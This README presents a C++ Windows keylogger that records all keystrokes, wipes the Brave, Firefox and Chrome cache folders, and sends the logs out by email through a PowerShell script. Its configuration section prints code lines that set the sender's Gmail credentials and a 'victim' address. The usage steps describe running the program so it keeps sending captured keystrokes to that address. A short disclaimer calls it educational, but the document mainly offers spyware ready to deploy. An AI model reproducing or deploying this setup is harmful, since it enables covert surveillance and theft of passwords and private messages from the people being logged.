# Keylogger Project

## Overview

This is a simple keylogger written in C++ for Windows. The keylogger captures keystrokes, clears browser caches for Brave, Mozilla Firefox, and Google Chrome, and sends the captured data to a specified email address.

## Features

- **Capture Keystrokes:** Logs all key presses and special keys (e.g., BACKSPACE, TAB, SHIFT).
- **Clear Browser Caches:** Deletes and recreates cache directories for Brave, Mozilla Firefox, and Google Chrome.
- **Email Logging Data:** Sends the logged keystrokes to a specified email address using PowerShell.

## Disclaimer

This project is intended for educational purposes only. Unauthorized use of keyloggers or other forms of spyware is illegal and unethical. Always obtain proper authorization before using or distributing this software.

## Prerequisites

- Windows OS
- A valid email account to send logs (Gmail is used in the script)
- PowerShell installed on your system

## Installation

1. **Clone the Repository:**

   ```bash
   git clone <repository-url>
   cd <repository-directory>
2. **Compile the Code:**
   
   ```bash
   g++ keylogger.cpp
## Configuration
#### 1. Edit Email Configuration:

Open the keylogger.cpp file and modify the SentMail function to include your email credentials and the victim's email address:

    
    fprintf(fp,"$Myemail=\"<your-email-id>\"\n"); // Input your email ID here
    fprintf(fp,"$Mypass=\"<your-email-password>\"\n"); // Input your email password here
    fprintf(fp,"$to=\"<victim-email>\"\n"); // Input the victim's email ID here

#### 2. Compile and Run:

Compile the code as described above and run the executable. The keylogger will start capturing keystrokes, clearing browser caches, and sending logs to the specified email address.

## Usage
### 1. Run the Executable:

Execute the compiled keylogger binary.

### 2. Monitor Logs:

The keylogger will periodically send the captured keystrokes to the configured email address.

## Security and Privacy
- Ensure you have explicit permission to use this keylogger.
- Be cautious about handling sensitive data.
- The keylogger clears cache directories, which might affect browser performance or user experience.
## Troubleshooting
- Compilation Errors: Ensure you have the necessary Windows SDK installed.
- Email Sending Issues: Verify email credentials and SMTP settings.
## License
This project is provided for educational purposes under the MIT License.

## Author
- #### Name: Harshit
- #### Email: harshitbhardwaj845@gmail.com
